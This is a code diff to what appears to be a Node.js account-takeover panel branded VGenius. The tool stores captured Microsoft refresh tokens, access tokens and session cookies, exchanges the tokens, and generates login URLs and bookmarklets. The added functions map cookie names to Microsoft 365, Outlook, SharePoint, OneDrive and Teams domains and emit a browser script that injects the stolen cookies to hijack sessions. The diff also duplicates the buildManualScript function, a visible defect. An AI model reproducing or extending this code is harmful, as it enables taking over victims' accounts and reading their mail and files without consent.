@@ -49,7 +49,7 @@ async function exchangeRefreshToken(refreshToken, tenant, clientId, accountType)
     const response = await axios.post(
       endpoint,
       new URLSearchParams({
-        client_id: clientId || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+        client_id: clientId || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e',
         grant_type: 'refresh_token',
         refresh_token: refreshToken,
         scope: scopes,
@@ -165,7 +165,7 @@ router.get('/exchange/:id', async (req, res) => {
     }
 
     const tenant = tokenRecord.tenant || config.AZURE_TENANT || 'common';
-    const clientId = tokenRecord.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const clientId = tokenRecord.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
     const accountType = tokenRecord.account_type || (
       (tenant === 'consumers' || (refreshToken && refreshToken.startsWith('0.'))) ? 'personal' : 'work_school'
     );
@@ -266,7 +266,7 @@ router.get('/page/:id', async (req, res) => {
     let storedCookies = decrypt(tokenRecord.cookies_encrypted);
 
     const tenant = tokenRecord.tenant || config.AZURE_TENANT || 'common';
-    const clientId = tokenRecord.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const clientId = tokenRecord.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
     const accountType = tokenRecord.account_type || (
       (tenant === 'consumers' || (refreshToken && refreshToken.startsWith('0.'))) ? 'personal' : 'work_school'
     );
@@ -389,7 +389,7 @@ router.get('/raw/:id', async (req, res) => {
     const accessToken = decrypt(token.access_token_encrypted);
 
     const tenant = token.tenant || config.AZURE_TENANT || 'common';
-    const clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const clientId = token.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
     const accountType = token.account_type || 'unknown';
 
     if (refreshToken) {
@@ -435,7 +435,7 @@ router.get('/raw/:id', async (req, res) => {
  * Generate a Microsoft URL that contains the access token for authentication
  */
 function generateLoginUrl(accessToken, tokenType, tenant, clientId, accountType) {
-  const clientIdSafe = clientId || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+  const clientIdSafe = clientId || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
   const tenantSafe = tenant || 'common';
   const encodedToken = encodeURIComponent(accessToken);
 
@@ -694,6 +694,47 @@ function generateCookieFallbackPage(cookieString, tenant, accountType) {
         '4. Press F5 to refresh the page';
     }
 
+    function getCookieDomain(name, tenant, accountType) {
+      var n = name.toLowerCase();
+      if (accountType === 'personal') {
+        if (n === 'x-ms-refreshtokencredential' || n === 'refreshtoken') return '.login.live.com';
+        if (n.indexOf('mscc') !== -1 || n.indexOf('crslst') !== -1 || n.indexOf('stssvc') !== -1 || n.indexOf('wgctx') !== -1) return '.login.live.com';
+        return '.login.live.com';
+      }
+      if (n === 'x-ms-refreshtokencredential' || n === 'refreshtoken' || n === 'pst' || n === 'esx' || n === 'gtmk' || n === 'es' || n === 'pplms') {
+        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
+      }
+      if (n === 'scauth' || n === 'signinchallenge' || n === 'accountauthcookie' || n === 'amlbgen') {
+        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
+      }
+      if (n.indexOf('x-ms') !== -1 || n.indexOf('msauth') !== -1) return '.login.microsoftonline.com';
+      if (n === '_oacl' || n === '_rcid' || n === 'rupdt' || n === 'mclrc' || n === 'wssblocation') return '.office.com';
+      if (n === 'waaf' || n === 'msswfs' || n === 'rstt' || n.indexOf('onedrive') !== -1) return '.onedrive.live.com';
+      if (n === 'clientinfo' || n === 'exauthcookie' || n.indexOf('outlook') !== -1) return '.outlook.office365.com';
+      if (n === 'spoidcrl' || n === 'spoextensionsdk' || n.indexOf('sharepoint') !== -1) return '.sharepoint.com';
+      if (n === 'teamssession' || n.indexOf('teams') !== -1) return '.teams.microsoft.com';
+      return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
+    }
+
+    function buildManualScript() {
+      var pairs = cookieStr.split(';');
+      var script = '';
+      for (var i = 0; i < pairs.length; i++) {
+        var pair = pairs[i].trim();
+        var eqIdx = pair.indexOf('=');
+        if (eqIdx > 0) {
+          var name = pair.substring(0, eqIdx).trim();
+          var value = pair.substring(eqIdx + 1).trim();
+          var nameLower = name.toLowerCase();
+          if (nameLower !== 'expires' && nameLower !== 'max-age' && nameLower !== 'domain' && nameLower !== 'path' && nameLower !== 'secure' && nameLower !== 'samesite') {
+            var domain = getCookieDomain(name, '${safeTenant}', '${accountType||'unknown'}');
+            script += 'document.cookie = "' + name + '=' + encodeURIComponent(value) + '; domain=' + domain + '; path=/; Secure";\\n';
+          }
+        }
+      }
+      script += '\\nconsole.log("[VGenius] Cookies injected! Now navigate to https://www.office.com/ and press F5.");';
+      return script;
+    }
     function buildManualScript() {
       var pairs = cookieStr.split(';');
       var script = '';
@@ -744,7 +785,7 @@ router.get('/bookmarklet/:id', async (req, res) => {
     const accessToken = decrypt(token.access_token_encrypted);
 
     const tenant = token.tenant || config.AZURE_TENANT || 'common';
-    const clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const clientId = token.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
     const accountType = token.account_type || 'unknown';
 
     // If we have a refresh token, exchange it first
